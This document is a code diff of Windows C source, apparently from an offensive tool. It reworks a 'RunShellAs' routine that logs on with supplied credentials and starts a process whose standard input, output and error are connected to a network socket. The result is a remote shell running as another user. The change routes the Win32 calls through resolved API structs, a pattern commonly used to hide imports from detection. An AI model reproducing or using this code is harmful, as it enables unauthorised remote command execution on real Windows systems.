@@ -16,24 +16,24 @@
 
 //#pragma warning(disable:4996)
 
-BOOL runAS(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, LPCWSTR appName, STARTUPINFOW si, PROCESS_INFORMATION* ProcessInfo, HANDLE * pHToken) {
+BOOL runAS(Kernel32_API kernel32, Advapi32_API advapi32, Userenv_API userenv, LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, LPCWSTR appName, STARTUPINFOW si, PROCESS_INFORMATION* ProcessInfo, HANDLE * pHToken) {
     BOOL retVal = FALSE;
     HANDLE hToken;
 
-    if (LogonUserW(lpszUsername, lpszDomain, lpszPassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken)) {
+    if (advapi32.LogonUserWF(lpszUsername, lpszDomain, lpszPassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken)) {
         LPVOID    lpvEnv;
         
         *pHToken = hToken;
-        if (CreateEnvironmentBlock(&lpvEnv, hToken, TRUE)) {
+        if (userenv.CreateEnvironmentBlockF(&lpvEnv, hToken, TRUE)) {
             WCHAR     szUserProfile[256] = L"";
             DWORD     dwSize = sizeof(szUserProfile) / sizeof(WCHAR);
 
-            if (GetUserProfileDirectoryW(hToken, szUserProfile, &dwSize)) {
-                if (!CreateProcessWithLogonW(lpszUsername, lpszDomain, lpszPassword, LOGON_WITH_PROFILE, NULL, (LPWSTR)appName, CREATE_UNICODE_ENVIRONMENT, lpvEnv, szUserProfile,&si, ProcessInfo))
+            if (userenv.GetUserProfileDirectoryWF(hToken, szUserProfile, &dwSize)) {
+                if (!advapi32.CreateProcessWithLogonWF(lpszUsername, lpszDomain, lpszPassword, LOGON_WITH_PROFILE, NULL, (LPWSTR)appName, CREATE_UNICODE_ENVIRONMENT, lpvEnv, szUserProfile,&si, ProcessInfo))
                     printMsg(STATUS_ERROR, LEVEL_DEFAULT, "CreateProcessWithLogonW");
             }else
                 printMsg(STATUS_ERROR, LEVEL_DEFAULT, "GetUserProfileDirectory");
-            if (!DestroyEnvironmentBlock(lpvEnv))
+            if (!userenv.DestroyEnvironmentBlockF(lpvEnv))
                 printMsg(STATUS_ERROR, LEVEL_DEFAULT, "DestroyEnvironmentBlock");
         }else
             printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail CreateEnvironmentBlock");
@@ -41,7 +41,7 @@ BOOL runAS(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, LPCWS
         printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail LogonUser");
     return retVal;
 }
-BOOL RunShellAs(Kernel32_API kernel32, Advapi32_API advapi32, Arguments listAgrument) {
+BOOL RunShellAs(Kernel32_API kernel32, Advapi32_API advapi32, Userenv_API userenv, Arguments listAgrument) {
     BOOL exitPorcess = FALSE;
     SOCKADDR_IN sAddr;
 
@@ -73,7 +73,7 @@ BOOL RunShellAs(Kernel32_API kernel32, Advapi32_API advapi32, Arguments listAgru
                 StartupInfo.hStdError = (HANDLE)mySocket;
 
 
-                retVal = runAS(listAgrument.lpszUsername, listAgrument.lpszDomain, listAgrument.lpszPassword,
+                retVal = runAS(kernel32, advapi32, userenv, listAgrument.lpszUsername, listAgrument.lpszDomain, listAgrument.lpszPassword,
                     listAgrument.Process, StartupInfo, &ProcessInfo, &hToken);
 
                 SendInitInfo(kernel32, advapi32,mySocket, hToken);
